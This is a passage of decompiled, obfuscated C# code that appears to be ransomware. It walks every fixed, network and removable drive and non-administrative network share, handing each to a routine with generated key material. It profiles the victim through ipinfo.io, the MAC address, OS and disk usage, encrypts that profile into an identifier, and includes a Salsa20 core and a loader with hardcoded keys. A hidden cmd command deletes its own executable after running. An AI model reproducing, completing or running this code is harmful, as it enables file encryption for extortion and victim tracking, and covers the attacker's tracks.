		File.SetLastWriteTime(string_0, @class.method_10());
	}

	static Class15.Class16[] smethod_72(Class15 class15_0)
	{
		if (class15_0.class16_0 == null)
		{
			class15_0.class16_0 = Class21.smethod_27(class15_0).ToArray();
		}
		return class15_0.class16_0;
	}

	static string smethod_73(JsonNode jsonNode_0)
	{
		return jsonNode_0?.ToString();
	}

	static Class23.Class27 smethod_74(Class23.Class28 class28_0)
	{
		byte[] array = new byte[class28_0.int_3];
		Array.Copy(class28_0.byte_1, 0, array, 0, class28_0.int_3);
		return new Class23.Class27(array);
	}

	static string smethod_75(string string_0, string string_1)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0);
			processStartInfo.Arguments = string_1;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			process.StartInfo = processStartInfo;
			process.Start();
			string result = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return result;
		}
		catch (Exception)
		{
			return null;
		}
	}

	static void smethod_76(Class23.Class26 class26_0, int int_0)
	{
		if (class26_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class26_0.byte_0[class26_0.int_0++] = (byte)int_0;
		class26_0.int_0 &= 32767;
	}

	static void smethod_77(Class15 class15_0, string string_0)
	{
		for (int i = 0; i < Class21.smethod_72(class15_0).Length; i++)
		{
			Class15.Class16 @class = Class21.smethod_72(class15_0)[i];
			string text = Path.Combine(string_0, @class.method_0());
			Directory.CreateDirectory(Path.GetDirectoryName(text));
			if (!Class21.smethod_109(@class))
			{
				Class21.smethod_71(text, class15_0, @class.method_0());
			}
			class15_0.eventHandler_0?.Invoke(class15_0, new Class15.EventArgs0(i + 1, Class21.smethod_72(class15_0).Length, @class.method_0()));
		}
	}

	static byte[] smethod_78(int int_0)
	{
		byte[] array = new byte[int_0];
		new RNGCryptoServiceProvider().GetNonZeroBytes(array);
		return array;
	}

	unsafe static void smethod_79(Stream stream_0, Class15.Class16 class16_0, Class15 class15_0)
	{
		void* ptr = stackalloc byte[12];
		class15_0.method_0().Seek(class16_0.method_12(), SeekOrigin.Begin);
		if (class15_0.method_2().ReadInt32() != 67324752)
		{
			throw new InvalidDataException("File signature doesn't match.");
		}
		class15_0.method_0().Seek(class16_0.method_14(), SeekOrigin.Begin);
		Stream stream = class15_0.method_0();
		if (class16_0.method_8())
		{
			stream = new DeflateStream(class15_0.method_0(), CompressionMode.Decompress, leaveOpen: true);
		}
		*(int*)ptr = class16_0.method_6();
		*(int*)((byte*)ptr + 4) = Math.Min(16384, class16_0.method_6());
		byte[] array = new byte[*(int*)((byte*)ptr + 4)];
		Class15.Class17 @class = new Class15.Class17();
		while (*(int*)ptr > 0)
		{
			*(int*)((byte*)ptr + 8) = stream.Read(array, 0, *(int*)((byte*)ptr + 4));
			if (*(int*)((byte*)ptr + 8) == 0)
			{
				break;
			}
			Class21.smethod_97(array, *(int*)((byte*)ptr + 8), @class);
			stream_0.Write(array, 0, *(int*)((byte*)ptr + 8));
			*(int*)ptr -= *(int*)((byte*)ptr + 8);
		}
		if ((@class.uint_1 ^ 0xFFFFFFFFu) != class16_0.method_3())
		{
			throw new InvalidDataException($"Corrupted archive: CRC32 doesn't match on file {class16_0.method_0()}: expected {class16_0.method_3():x8}, got {@class.uint_1 ^ 0xFFFFFFFFu:x8}.");
		}
	}

	unsafe static string smethod_80(byte[] byte_0)
	{
		void* ptr = stackalloc byte[5];
		char[] array = new char[byte_0.Length * 2];
		*(int*)ptr = 0;
		int num = 0;
		while (*(int*)ptr < byte_0.Length)
		{
			((byte*)ptr)[4] = (byte)(byte_0[*(int*)ptr] >> 4);
			array[num] = (char)((((byte*)ptr)[4] > 9) ? (((byte*)ptr)[4] + 55 + 32) : (((byte*)ptr)[4] + 48));
			((byte*)ptr)[4] = (byte)(byte_0[*(int*)ptr] & 0xFu);
			array[++num] = (char)((((byte*)ptr)[4] > 9) ? (((byte*)ptr)[4] + 55 + 32) : (((byte*)ptr)[4] + 48));
			(*(int*)ptr)++;
			num++;
		}
		return new string(array);
	}

	static uint smethod_81(int int_0, byte[] byte_0)
	{
		return (uint)(byte_0[int_0] | (byte_0[int_0 + 1] << 8) | (byte_0[int_0 + 2] << 16) | (byte_0[int_0 + 3] << 24));
	}

	static long smethod_82(string string_0)
	{
		try
		{
			return new FileInfo(string_0).Length;
		}
		catch (Exception)
		{
		}
		return 0L;
	}

	static void smethod_83()
	{
		Class21.smethod_87(Class6.Class7.smethod_2(), Class6.Class7.smethod_4());
		Class6.Class7.smethod_3(null);
		Class6.Class7.smethod_5(null);
	}

	static string smethod_84()
	{
		string text = "";
		int num = 0;
		do
		{
			try
			{
				HttpWebRequest obj = (HttpWebRequest)WebRequest.Create("https://ipinfo.io/json");
				obj.Timeout = 10000;
				obj.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko";
				HttpWebResponse httpWebResponse = (HttpWebResponse)obj.GetResponse();
				text = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding(httpWebResponse.CharacterSet)).ReadToEnd();
			}
			catch (Exception)
			{
			}
			num++;
			if (string.IsNullOrEmpty(text) && num >= 3)
			{
				return null;
			}
		}
		while (string.IsNullOrEmpty(text));
		return Regex.Split(text, "\"ip\": \"")[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, "\"org\": \"")[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, "\"city\": \"")[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, "\"country\": \"")[1].Split(new char[1] { '"' })[0];
	}

	static void smethod_85(Class23.Class25 class25_0)
	{
		class25_0.uint_0 >>= class25_0.int_2 & 7;
		class25_0.int_2 &= -8;
	}

	static IEnumerator smethod_86(JsonObject jsonObject_0)
	{
		return new JsonObject.Class0(0)
		{
			jsonObject_0 = jsonObject_0
		};
	}

	unsafe static void smethod_87(byte[] byte_0, byte[] byte_1)
	{
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		void* ptr = stackalloc byte[5];
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			*(int*)ptr = 0;
			while (*(int*)ptr < logicalDrives.Length)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[*(int*)ptr]);
				if (((driveInfo.IsReady && driveInfo.DriveType != DriveType.CDRom) || driveInfo.DriveType != 0) && ((Class4.Class5.smethod_20() && driveInfo.DriveType == DriveType.Fixed) || (Class4.Class5.smethod_22() && driveInfo.DriveType == DriveType.Network) || (Class4.Class5.smethod_24() && driveInfo.DriveType == DriveType.Removable)))
				{
					Class21.smethod_20(driveInfo.Name, byte_0, byte_1);
				}
				(*(int*)ptr)++;
			}
			Class3 @class = Class21.smethod_90();
			if (@class == null)
			{
				return;
			}
			foreach (object item in @class)
			{
				string text = item.ToString();
				((byte*)ptr)[4] = 0;
				if (!text.Contains("ADMIN$") && !text.Contains("IPC$") && !text.Contains("print$") && !text.Contains("$"))
				{
					((byte*)ptr)[4] = 1;
				}
				if (((byte*)ptr)[4] != 0)
				{
					Class21.smethod_20(text, byte_0, byte_1);
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	unsafe static string smethod_88()
	{
		void* ptr = stackalloc byte[8];
		string empty = string.Empty;
		try
		{
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			*(int*)ptr = 0;
			while (*(int*)ptr < allNetworkInterfaces.Length)
			{
				NetworkInterface networkInterface = allNetworkInterfaces[*(int*)ptr];
				if (networkInterface.OperationalStatus != OperationalStatus.Up)
				{
					(*(int*)ptr)++;
					continue;
				}
				empty += networkInterface.GetPhysicalAddress().ToString();
				string[] array = new string[empty.Length];
				*(int*)((byte*)ptr + 4) = 0;
				while (*(int*)((byte*)ptr + 4) < empty.Length)
				{
					array[*(int*)((byte*)ptr + 4)] = Encoding.UTF8.GetBytes(empty)[*(int*)((byte*)ptr + 4)].ToString("x2");
					(*(int*)((byte*)ptr + 4))++;
				}
				return string.Join(":", array);
			}
			return empty;
		}
		catch (Exception)
		{
			return null;
		}
	}

	unsafe static int smethod_89(Class15 class15_0, int int_0)
	{
		void* ptr = stackalloc byte[12];
		*(long*)ptr = class15_0.method_0().Position;
		class15_0.method_0().Seek(int_0 + 26, SeekOrigin.Begin);
		*(short*)((byte*)ptr + 8) = class15_0.method_2().ReadInt16();
		*(short*)((byte*)ptr + 10) = class15_0.method_2().ReadInt16();
		int result = (int)class15_0.method_0().Position + *(short*)((byte*)ptr + 8) + *(short*)((byte*)ptr + 10);
		class15_0.method_0().Seek(*(long*)ptr, SeekOrigin.Begin);
		return result;
	}

	static Class3 smethod_90()
	{
		return Class3.class3_0 ?? (Class3.class3_0 = new Class3());
	}

	static void smethod_91(int int_0)
	{
		try
		{
			string arg = string.Concat("ping 127.0.0.1 -n 3 > NUL&&" + $"del /Q /F /S \"{Application.get_ExecutablePath()}\"");
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = $"/C {arg}";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
			Environment.Exit(int_0);
		}
		catch (Exception)
		{
		}
	}

	static int smethod_92(Class23.Class25 class25_0)
	{
		return class25_0.int_1 - class25_0.int_0 + (class25_0.int_2 >> 3);
	}

	static double smethod_93(JsonNode jsonNode_0)
	{
		return (double)Convert.ChangeType(((JsonBasic)jsonNode_0).m_value, typeof(double));
	}

	static bool smethod_94(Assembly assembly_0, Assembly assembly_1)
	{
		return true;
	}

	[DllImport("netapi32", CharSet = CharSet.Unicode, EntryPoint = "NetShareEnum")]
	static extern int NetShareEnum_1(string string_0, int int_0, out IntPtr intptr_0, int int_1, out int int_2, out int int_3, ref int int_4);

	unsafe static int smethod_95(int int_0, int int_1, Class23.Class24 class24_0, byte[] byte_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		do
		{
			if (class24_0.int_4 != 11)
			{
				*(int*)((byte*)ptr + 4) = Class21.smethod_49(byte_0, int_0, class24_0.class26_0, int_1);
				int_1 += *(int*)((byte*)ptr + 4);
				*(int*)ptr += *(int*)((byte*)ptr + 4);
				int_0 -= *(int*)((byte*)ptr + 4);
				if (int_0 == 0)
				{
					return *(int*)ptr;
				}
			}
		}
		while (Class21.smethod_2(class24_0) || (class24_0.class26_0.int_1 > 0 && class24_0.int_4 != 11));
		return *(int*)ptr;
	}

	unsafe static bool smethod_96(Class23.Class24 class24_0)
	{
		void* ptr = stackalloc byte[12];
		int num = Class21.smethod_102(class24_0.class26_0);
		while (num >= 258)
		{
			*(int*)ptr = class24_0.int_4;
			switch (*(int*)ptr)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class21.smethod_64(class24_0.class27_0, class24_0.class25_0)) & -256) == 0)
				{
					Class21.smethod_76(class24_0.class26_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class24_0.int_6 = Class23.Class24.int_0[num2 - 257];
					class24_0.int_5 = Class23.Class24.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class24_0.class27_1 = null;
				class24_0.class27_0 = null;
				class24_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class24_0.int_5 > 0)
				{
					class24_0.int_4 = 8;
					*(int*)((byte*)ptr + 4) = Class21.smethod_65(class24_0.class25_0, class24_0.int_5);
					if (*(int*)((byte*)ptr + 4) < 0)
					{
						return false;
					}
					Class21.smethod_7(class24_0.class25_0, class24_0.int_5);
					class24_0.int_6 += *(int*)((byte*)ptr + 4);
				}
				class24_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class21.smethod_64(class24_0.class27_1, class24_0.class25_0);
				if (num2 >= 0)
				{
					class24_0.int_7 = Class23.Class24.int_2[num2];
					class24_0.int_5 = Class23.Class24.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class24_0.int_5 > 0)
				{
					class24_0.int_4 = 10;
					*(int*)((byte*)ptr + 8) = Class21.smethod_65(class24_0.class25_0, class24_0.int_5);
					if (*(int*)((byte*)ptr + 8) < 0)
					{
						return false;
					}
					Class21.smethod_7(class24_0.class25_0, class24_0.int_5);
					class24_0.int_7 += *(int*)((byte*)ptr + 8);
				}
				Class21.smethod_107(class24_0.class26_0, class24_0.int_6, class24_0.int_7);
				num -= class24_0.int_6;
				class24_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static void smethod_97(byte[] byte_0, int int_0, Class15.Class17 class17_0)
	{
		for (int i = 0; i < int_0; i++)
		{
			class17_0.uint_1 = (class17_0.uint_1 >> 8) ^ Class15.Class17.uint_0[byte_0[i] ^ (class17_0.uint_1 & 0xFF)];
		}
	}

	static void smethod_98(Class3 class3_0, string string_0)
	{
		if (!string.IsNullOrEmpty(string_0) && !Class21.smethod_56())
		{
			string_0 = string_0.ToUpper();
			if ('\\' != string_0[0] || '\\' != string_0[1])
			{
				string_0 = "\\\\" + string_0;
			}
		}
		if (Class21.smethod_29())
		{
			Class21.smethod_0(class3_0, string_0);
		}
		else
		{
			Class21.smethod_46(string_0, class3_0);
		}
	}

	unsafe static bool smethod_99()
	{
		void* ptr = stackalloc byte[9];
		try
		{
			string string_ = "Unknown";
			*(int*)ptr = 16;
			Class6.Class7.smethod_7(Class21.smethod_36(5, bool_0: false));
			Class6.Class7.smethod_7(Class6.Class7.smethod_6().ToUpper());
			string text = Class21.smethod_84();
			if (text != null && !(text == ""))
			{
				if (text.Split(new char[1] { ',' })[0] == "")
				{
					Class6.Class7.smethod_11(string_);
				}
				else
				{
					Class6.Class7.smethod_11(text.Split(new char[1] { ',' })[0]);
				}
				if (text.Split(new char[1] { ',' })[1] == "")
				{
					Class6.Class7.smethod_13(string_);
				}
				else
				{
					Class6.Class7.smethod_13(text.Split(new char[1] { ',' })[1]);
				}
				if (text.Split(new char[1] { ',' })[2] == "")
				{
					Class6.Class7.smethod_19(string_);
				}
				else
				{
					Class6.Class7.smethod_19(text.Split(new char[1] { ',' })[2]);
				}
				if (text.Split(new char[1] { ',' })[3] == "")
				{
					Class6.Class7.smethod_17(string_);
				}
				else
				{
					Class6.Class7.smethod_17(text.Split(new char[1] { ',' })[3]);
				}
			}
			else
			{
				Class6.Class7.smethod_11(string_);
				Class6.Class7.smethod_13(string_);
				Class6.Class7.smethod_19(string_);
				Class6.Class7.smethod_17(string_);
			}
			string text2 = Class21.smethod_88();
			if (!string.IsNullOrEmpty(text2))
			{
				Class6.Class7.smethod_15(text2);
			}
			else
			{
				Class6.Class7.smethod_15(string_);
			}
			Class6.Class7.smethod_9(Environment.OSVersion.ToString());
			string[] logicalDrives = Environment.GetLogicalDrives();
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < logicalDrives.Length)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[*(int*)((byte*)ptr + 4)]);
				Class6.Class7.smethod_21(Class6.Class7.smethod_20() + 1);
				if (driveInfo.IsReady)
				{
					if (driveInfo.DriveType == DriveType.Fixed)
					{
						Class6.Class7.smethod_23(Class6.Class7.smethod_22() + 1);
					}
					if (driveInfo.DriveType == DriveType.Network)
					{
						Class6.Class7.smethod_25(Class6.Class7.smethod_24() + 1);
					}
					Class6.Class7.smethod_27(Class6.Class7.smethod_26() + Convert.ToInt32((driveInfo.TotalSize - driveInfo.TotalFreeSpace) / 1000000000L));
				}
				(*(int*)((byte*)ptr + 4))++;
			}
			Class6.Class7.smethod_3(Class21.smethod_78(Class4.Class5.smethod_42()));
			Class6.Class7.smethod_5(Class21.smethod_78(*(int*)ptr));
			string s = Class21.smethod_80(Class6.Class7.smethod_2()) + char.ToString(',') + Class21.smethod_80(Class6.Class7.smethod_4()) + char.ToString(',') + Class6.Class7.smethod_8() + char.ToString(',') + Class6.Class7.smethod_14() + char.ToString(',') + Class6.Class7.smethod_10() + char.ToString(',') + Class6.Class7.smethod_12() + char.ToString(',') + Class6.Class7.smethod_16() + char.ToString(',') + Class6.Class7.smethod_18() + char.ToString(',') + Convert.ToString(Class6.Class7.smethod_20()) + char.ToString(',') + Convert.ToString(Class6.Class7.smethod_22()) + char.ToString(',') + Convert.ToString(Class6.Class7.smethod_24()) + char.ToString(',') + Convert.ToString(Class6.Class7.smethod_26()) + char.ToString(',') + Convert.ToString(Class4.Class5.smethod_34()) + char.ToString(',') + Convert.ToString(Class4.Class5.smethod_1());
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			byte[] array = Class21.smethod_78(Class4.Class5.smethod_40());
			bytes = Class21.smethod_45(bytes, array);
			array = Class21.smethod_48(Class4.Class5.smethod_38(), array);
			byte[] byte_ = Class21.smethod_111(new byte[2][] { bytes, array });
			if (array == null)
			{
				((byte*)ptr)[8] = 0;
			}
			else
			{
				Class6.Class7.smethod_1(Class21.smethod_69(Class21.smethod_10(byte_), 64));
				((byte*)ptr)[8] = 1;
			}
		}
		catch (Exception)
		{
			goto IL_03ef;
		}
		return ((byte*)ptr)[8] != 0;
		IL_03ef:
		return false;
	}

	static ICryptoTransform smethod_100(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0);
	}

	unsafe static void smethod_101(Class8.Class9.Class10 class10_0, byte[] byte_0, uint[] uint_0)
	{
		void* ptr = stackalloc byte[8];
		uint[] array = (uint[])uint_0.Clone();
		*(int*)ptr = class10_0.int_0;
		while (*(int*)ptr > 0)
		{
			array[4] ^= Class21.smethod_42(7, array[0] + array[12]);
			array[8] ^= Class21.smethod_42(9, array[4] + array[0]);
			array[12] ^= Class21.smethod_42(13, array[8] + array[4]);
			array[0] ^= Class21.smethod_42(18, array[12] + array[8]);
			array[9] ^= Class21.smethod_42(7, array[5] + array[1]);
			array[13] ^= Class21.smethod_42(9, array[9] + array[5]);
			array[1] ^= Class21.smethod_42(13, array[13] + array[9]);
			array[5] ^= Class21.smethod_42(18, array[1] + array[13]);
			array[14] ^= Class21.smethod_42(7, array[10] + array[6]);
			array[2] ^= Class21.smethod_42(9, array[14] + array[10]);
			array[6] ^= Class21.smethod_42(13, array[2] + array[14]);
			array[10] ^= Class21.smethod_42(18, array[6] + array[2]);
			array[3] ^= Class21.smethod_42(7, array[15] + array[11]);
			array[7] ^= Class21.smethod_42(9, array[3] + array[15]);
			array[11] ^= Class21.smethod_42(13, array[7] + array[3]);
			array[15] ^= Class21.smethod_42(18, array[11] + array[7]);
			array[1] ^= Class21.smethod_42(7, array[0] + array[3]);
			array[2] ^= Class21.smethod_42(9, array[1] + array[0]);
			array[3] ^= Class21.smethod_42(13, array[2] + array[1]);
			array[0] ^= Class21.smethod_42(18, array[3] + array[2]);
			array[6] ^= Class21.smethod_42(7, array[5] + array[4]);
			array[7] ^= Class21.smethod_42(9, array[6] + array[5]);
			array[4] ^= Class21.smethod_42(13, array[7] + array[6]);
			array[5] ^= Class21.smethod_42(18, array[4] + array[7]);
			array[11] ^= Class21.smethod_42(7, array[10] + array[9]);
			array[8] ^= Class21.smethod_42(9, array[11] + array[10]);
			array[9] ^= Class21.smethod_42(13, array[8] + array[11]);
			array[10] ^= Class21.smethod_42(18, array[9] + array[8]);
			array[12] ^= Class21.smethod_42(7, array[15] + array[14]);
			array[13] ^= Class21.smethod_42(9, array[12] + array[15]);
			array[14] ^= Class21.smethod_42(13, array[13] + array[12]);
			array[15] ^= Class21.smethod_42(18, array[14] + array[13]);
			*(int*)ptr -= 2;
		}
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < 16)
		{
			Class21.smethod_55(array[*(int*)((byte*)ptr + 4)] + uint_0[*(int*)((byte*)ptr + 4)], byte_0, 4 * *(int*)((byte*)ptr + 4));
			(*(int*)((byte*)ptr + 4))++;
		}
	}

	static int smethod_102(Class23.Class26 class26_0)
	{
		return 32768 - class26_0.int_1;
	}

	static ICryptoTransform smethod_103(byte[] byte_0, bool bool_0, byte[] byte_1)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_1, byte_0) : dESCryptoServiceProvider.CreateEncryptor(byte_1, byte_0);
	}

	static JsonNode smethod_104(string string_0)
	{
		return JsonNode.smethod_0(Class21.smethod_22(string_0));
	}

	static bool smethod_105(Class2 class2_0)
	{
		if ((class2_0.method_3() & Enum0.flag_2) != 0)
		{
			return false;
		}
		if ((class2_0.method_3() & Enum0.flag_3) != 0)
		{
			return false;
		}
		if ((class2_0.method_3() & Enum0.flag_1) != 0)
		{
			return false;
		}
		if ((class2_0.method_3() & Enum0.flag_4) == 0)
		{
			return true;
		}
		if (Enum0.flag_4 == class2_0.method_3() && !string.IsNullOrEmpty(class2_0.method_1()))
		{
			return true;
		}
		return false;
	}

	unsafe static string smethod_106(string string_0)
	{
		void* ptr = stackalloc byte[5];
		StringBuilder stringBuilder = new StringBuilder();
		*(int*)ptr = 0;
		while (*(int*)ptr < string_0.Length)
		{
			char c = string_0[*(int*)ptr];
			switch (c)
			{
			case '"':
				stringBuilder.Append("\\\"");
				break;
			case '\b':
				stringBuilder.Append("\\b");
				break;
			case '\t':
				stringBuilder.Append("\\t");
				break;
			case '\n':
				stringBuilder.Append("\\n");
				break;
			case '\f':
				stringBuilder.Append("\\f");
				break;
			case '\r':
				stringBuilder.Append("\\r");
				break;
			case '\\':
				stringBuilder.Append("\\\\");
				break;
			default:
				if (c < ' ')
				{
					((byte*)ptr)[4] = Convert.ToByte(c);
					stringBuilder.Append("\\u00" + ((byte*)ptr)[4].ToString("x2").ToUpper());
				}
				else
				{
					stringBuilder.Append(c);
				}
				break;
			case '/':
				stringBuilder.Append(c);
				break;
			}
			(*(int*)ptr)++;
		}
		return stringBuilder.ToString();
	}

	static void smethod_107(Class23.Class26 class26_0, int int_0, int int_1)
	{
		if ((class26_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class26_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class26_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class26_0.byte_0, num, class26_0.byte_0, class26_0.int_0, int_0);
				class26_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class26_0.byte_0[class26_0.int_0++] = class26_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class21.smethod_41(class26_0, num, int_0, int_1);
		}
	}

	static int smethod_108(string string_0)
	{
		try
		{
			return Convert.ToInt32(string_0, 16);
		}
		catch (Exception)
		{
			return -1;
		}
	}

	static bool smethod_109(Class15.Class16 class16_0)
	{
		return class16_0.method_0().EndsWith("/");
	}

	static ResourceManager smethod_110()
	{
		if (Class14.resourceManager_0 == null)
		{
			Class14.resourceManager_0 = new ResourceManager("ns0.Class14", typeof(Class14).Assembly);
		}
		return Class14.resourceManager_0;
	}

	unsafe static byte[] smethod_111(byte[][] byte_0)
	{
		void* ptr = stackalloc byte[8];
		byte[] array = new byte[byte_0.Sum((byte[] byte_0) => byte_0.Length)];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < byte_0.Length)
		{
			byte[] array2 = byte_0[*(int*)((byte*)ptr + 4)];
			Buffer.BlockCopy(array2, 0, array, *(int*)ptr, array2.Length);
			*(int*)ptr += array2.Length;
			(*(int*)((byte*)ptr + 4))++;
		}
		return array;
	}

	unsafe static byte[] smethod_112(byte[] byte_0)
	{
		void* ptr = stackalloc byte[46];
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class21.smethod_94(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class23.Stream0 stream = new Class23.Stream0(byte_0);
		byte[] array = new byte[0];
		*(int*)ptr = Class21.smethod_17(stream);
		if (*(int*)ptr == 67324752)
		{
			*(short*)((byte*)ptr + 44) = (short)Class21.smethod_34(stream);
			*(int*)((byte*)ptr + 4) = Class21.smethod_34(stream);
			*(int*)((byte*)ptr + 8) = Class21.smethod_34(stream);
			if (*(int*)ptr != 67324752 || *(short*)((byte*)ptr + 44) != 20 || *(int*)((byte*)ptr + 4) != 0 || *(int*)((byte*)ptr + 8) != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class21.smethod_17(stream);
			Class21.smethod_17(stream);
			Class21.smethod_17(stream);
			*(int*)((byte*)ptr + 12) = Class21.smethod_17(stream);
			*(int*)((byte*)ptr + 16) = Class21.smethod_34(stream);
			*(int*)((byte*)ptr + 20) = Class21.smethod_34(stream);
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				byte[] buffer = new byte[*(int*)((byte*)ptr + 16)];
				stream.Read(buffer, 0, *(int*)((byte*)ptr + 16));
			}
			if (*(int*)((byte*)ptr + 20) > 0)
			{
				byte[] buffer2 = new byte[*(int*)((byte*)ptr + 20)];
				stream.Read(buffer2, 0, *(int*)((byte*)ptr + 20));
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class23.Class24 @class = new Class23.Class24(array2);
			array = new byte[*(int*)((byte*)ptr + 12)];
			Class23.Class24 class24_ = @class;
			byte[] byte_ = array;
			*(int*)((byte*)ptr + 40) = array.Length;
			Class21.smethod_95(*(int*)((byte*)ptr + 40), 0, class24_, byte_);
			array2 = null;
		}
		else
		{
			*(int*)((byte*)ptr + 24) = *(int*)ptr >> 24;
			*(int*)ptr -= *(int*)((byte*)ptr + 24) << 24;
			if (*(int*)ptr != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (*(int*)((byte*)ptr + 24) == 1)
			{
				*(int*)((byte*)ptr + 28) = Class21.smethod_17(stream);
				array = new byte[*(int*)((byte*)ptr + 28)];
				*(int*)((byte*)ptr + 32) = 0;
				while (*(int*)((byte*)ptr + 32) < *(int*)((byte*)ptr + 28))
				{
					int num = Class21.smethod_17(stream);
					*(int*)((byte*)ptr + 36) = Class21.smethod_17(stream);
					byte[] array3 = new byte[num];
					stream.Read(array3, 0, array3.Length);
					Class21.smethod_95(*(int*)((byte*)ptr + 36), *(int*)((byte*)ptr + 32), new Class23.Class24(array3), array);
					*(int*)((byte*)ptr + 32) += *(int*)((byte*)ptr + 36);
				}
			}
			if (*(int*)((byte*)ptr + 24) == 2)
			{
				byte[] byte_2 = new byte[8] { 111, 11, 185, 197, 221, 127, 123, 88 };
				byte[] byte_3 = new byte[8] { 115, 197, 53, 55, 216, 139, 55, 131 };
				using ICryptoTransform cryptoTransform = Class21.smethod_103(byte_3, bool_0: true, byte_2);
				array = Class21.smethod_112(cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4));
			}
			if (*(int*)((byte*)ptr + 24) == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class21.smethod_100(bool_0: true, byte_5, byte_4);
				array = Class21.smethod_112(cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4));
			}
		}
		stream.Close();
		stream = null;
		return array;
	}
}
